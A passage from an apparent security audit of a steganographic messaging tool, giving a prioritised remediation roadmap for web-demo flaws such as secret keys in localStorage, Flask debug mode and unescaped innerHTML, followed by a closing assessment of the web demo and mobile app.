**Recommendation:** Add `flask-limiter` with per-IP rate limits (e.g., 5 encodes/minute). For cat-mode video, limit to 2 uploads/minute.

### 3.5 Mobile: Native vs. JS Security Boundary

FLAG_SECURE is set in `MainActivity.kt` (Android native code), but the iOS privacy overlay is implemented in JS (`useSecureScreen.ts`) using `AppState` listeners. There's a 120ms delay between receiving `inactive` and showing the overlay — enough for the OS task-switcher to capture a screenshot of the screen content. This is a known iOS limitation but worth documenting as a residual risk.

---

## Step 4 — Prioritized Remediation Roadmap

| Priority | ID | Title | Effort | Impact |
|---|---|---|---|---|
| **P0/Immediate** | WD-01 | Remove secret keys from `localStorage` | M | Eliminates entire class of key extraction attacks |
| **P0/Immediate** | WD-05 | Disable Flask `debug=True` | S | Closes unauthenticated RCE via Werkzeug debugger |
| **P0/Immediate** | WD-12 | Fix incomplete duress wipe (`meow_pq_keypair`) | S | Ensures PQ key doesn't survive panic wipe |
| **P1/This Sprint** | WD-08 | Fix XSS — `escapeHtml()` all `innerHTML` injections | S | Prevents script injection → key theft chain |
| **P1/This Sprint** | WD-04 | Add CSP + security headers | S | Defense-in-depth against XSS and clickjacking |
| **P1/This Sprint** | WD-03 | Add CSRF protection via `flask-wtf` | M | Blocks cross-site forgery of encode/decode ops |
| **P1/This Sprint** | WD-06 | Sanitize all error messages (remove `str(e)`) | S | Stops info disclosure of internals |
| **P1/This Sprint** | WD-02 | Move ciphertext from `localStorage` to `sessionStorage`/memory | S | Reduces forensic persistence window |
| **P2/Next Sprint** | WD-10 | Validate cat-mode video token format | S | Closes path traversal vector |
| **P2/Next Sprint** | WD-14 | Reduce file persistence window to 5 min + immediate wipe post-download | S | Reduces forensic recovery window |
| **P2/Next Sprint** | M-01 | Fix session timeout to use hard deadline | S | Prevents indefinite capture sessions |
| **P2/Next Sprint** | M-02 | Encrypt MMKV + reduce checkpoint granularity | M | Reduces forensic metadata leakage |
| **P3/Backlog** | WD-09 | Fix cat-mode-protocol.js syntax error | S | Ensures `constantTimeEqual32` is properly exported |
| **P3/Backlog** | WD-13 | Guard preamble-calibration.js console.log | S | Reduces information leakage in shared contexts |
| **P3/Backlog** | WD-11 | Cap download_tokens dict size | S | Prevents memory exhaustion under load |
| **P3/Backlog** | M-03 | Explore native module for frame data (heap wipe) | L | Addresses JS string immutability limitation |

**Effort Key:** S = < 2 hours, M = 2–8 hours, L = 1+ week

---

## Step 5 — Closing Statement

The mobile app demonstrates an impressively hardened "dumb sensor" architecture — the decision to perform zero cryptographic operations on-device is the single most impactful security design choice in the entire project, and it's executed well. FLAG_SECURE, biometric-gated export, AppState-driven wipe, and Zod-strict validation form a solid defense perimeter.

The web demo is a different story. It was clearly built as a developer demo and has organically grown into a functional tool without undergoing security hardening. The combination of **secret keys in localStorage (WD-01) + XSS via unescaped innerHTML (WD-08) + no CSP (WD-04) + debug mode with 0.0.0.0 binding (WD-05)** creates a complete attack chain: inject script → exfiltrate all cryptographic keys → decrypt all past messages. For a tool used by journalists and activists, this chain is unacceptable.

**With the P0 fixes applied (< 1 day of work), the web demo reaches baseline safety. With the full P0+P1 remediation (~1 week), both `web_demo/` and `mobile/` reach production-hardened posture appropriate for the stated threat model.**

The cryptographic core (WASM module, Web Worker isolation, `secure_clear()`, `FinalizationRegistry`) is well-engineered. The remaining issues are all in the "last mile" of web application security and mobile metadata hygiene — fixable with straightforward, well-understood mitigations.

---

*End of audit. All findings verified against source code at HEAD.*
